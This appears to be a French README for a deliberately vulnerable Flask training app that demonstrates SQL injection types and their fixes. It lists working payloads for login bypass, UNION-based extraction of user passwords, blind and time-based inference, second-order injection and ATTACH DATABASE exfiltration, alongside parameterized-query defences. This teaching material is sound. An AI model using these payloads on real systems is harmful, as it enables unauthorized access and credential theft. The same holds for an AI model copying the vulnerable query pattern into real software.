# SQL Injection Demo

Application web de démonstration des différents types d'injections SQL pour la formation Cybersecurity.

## Présentation

Cette application permet de comprendre et tester les vulnérabilités SQL Injection dans un environnement contrôlé. Elle propose deux modes :

- **Mode Vulnérable** (rouge) : Requêtes SQL concaténées directement avec les inputs utilisateur
- **Mode Sécurisé** (vert) : Requêtes paramétrées qui empêchent les injections

## Types d'injections démontrées

| Type | Description | Page |
|------|-------------|------|
| Classic (In-band) | UNION-based, extraction directe des données | Clients, Articles |
| Authentication Bypass | Contourner l'authentification | Login |
| Blind (Boolean-based) | Inférer des informations via réponses true/false | Blind |
| Blind (Time-based) | Inférer via délais de réponse | Blind |
| Second-Order (Stored) | Payload stocké puis exploité | Stored |
| Out-of-band | Exfiltration via ATTACH DATABASE | Out-of-band |

## Installation

### Prérequis

- Python 3.8+
- pip

### Setup

```bash
# Cloner le repository
git clone https://github.com/cchopin/Jedha-cybersec-fullstack.git
cd Jedha-cybersec-fullstack/05_web_security/sql-injection

# Créer un environnement virtuel
python -m venv venv
source venv/bin/activate  # Linux/Mac
# ou
venv\Scripts\activate  # Windows

# Installer les dépendances
pip install flask

# Lancer l'application
python main.py
```

### Accès

Ouvrir **http://localhost:5001** dans votre navigateur.

## Screenshots

### Authentication Bypass (Login)

![Login Bypass](assets/login.png)

**Payload** : `admin'--`

La requête devient :
```sql
SELECT * FROM users WHERE name='admin'--' AND password='anything'
```
Le `--` commente la vérification du mot de passe.

---

### Classic In-band (UNION-based)

![In-band Injection](assets/inband.png)

**Payload** : `' UNION SELECT 1,name,password,email,date FROM users--`

Permet d'extraire les données d'autres tables en combinant les résultats avec UNION.

---

### Second-Order (Stored) Injection

![Stored Injection](assets/stored.png)

**Étape 1** : Créer un utilisateur avec nom malveillant `admin'--`

**Étape 2** : Se connecter avec ce nom → bypass d'authentification

L'insertion est sécurisée (paramétrée), mais le login réutilise la valeur stockée sans l'échapper.

---

### Out-of-band (ATTACH DATABASE)

![Out-of-band](assets/out%20of%20the%20band.png)

**Payload** : Chemin `/tmp/stolen.db` + Table `users`

SQLite permet d'écrire une base de données dans n'importe quel fichier accessible :
```sql
ATTACH DATABASE '/tmp/stolen.db' AS exfil;
CREATE TABLE exfil.stolen AS SELECT * FROM users;
```

## Structure du projet

```
sql-injection/
├── main.py              # Application Flask principale
├── db_init.py           # Initialisation de la base de données
├── vuln_connector.py    # Fonctions SQL vulnérables
├── safe_connector.py    # Fonctions SQL sécurisées
├── templates/           # Templates HTML
│   ├── base.html
│   ├── home.html
│   ├── index.html
│   ├── login.html
│   ├── users.html
│   ├── products.html
│   ├── orders.html
│   ├── blind.html
│   ├── stored.html
│   └── outofband.html
├── assets/              # Screenshots
└── README.md
```

## Exemples de payloads

### Authentication Bypass
```
admin'--
' OR '1'='1'--
' OR 1=1--
```

### UNION-based
```
' UNION SELECT 1,2,3,4,5--
' UNION SELECT 1,name,password,email,date FROM users--
' UNION SELECT 1,name,sql,4,5 FROM sqlite_master--
```

### Blind Boolean-based
```
admin' AND 1=1--    (vrai)
admin' AND 1=2--    (faux)
admin' AND (SELECT COUNT(*) FROM users)>0--
```

### Blind Time-based (SQLite)
```
1 AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)
```

### Second-Order
```
Créer user: admin'--
Login avec: admin'-- (n'importe quel password)
```

### Out-of-band
```
ATTACH DATABASE '/tmp/stolen.db' AS exfil;
CREATE TABLE exfil.stolen AS SELECT * FROM users;
```

## Comment se protéger ?

### 1. Requêtes paramétrées (Prepared Statements)
```python
# Vulnérable
query = f"SELECT * FROM users WHERE name='{username}'"

# Sécurisé
query = "SELECT * FROM users WHERE name=?"
cursor.execute(query, (username,))
```

### 2. Validation des entrées
- Vérifier le format attendu (email, nombres, etc.)
- Utiliser des whitelists pour les valeurs autorisées

### 3. Principe du moindre privilège
- Limiter les permissions de l'utilisateur DB
- Ne pas utiliser de compte admin pour l'application

### 4. ORM (Object-Relational Mapping)
- Utiliser SQLAlchemy ou Django ORM
- Déléguer la construction des requêtes au framework


## Auteur

Made with ❤️ | [GitHub](https://github.com/cchopin/Jedha-cybersec-fullstack/tree/main/05_web_security/sql-injection)

*CSS créés avec Claude*
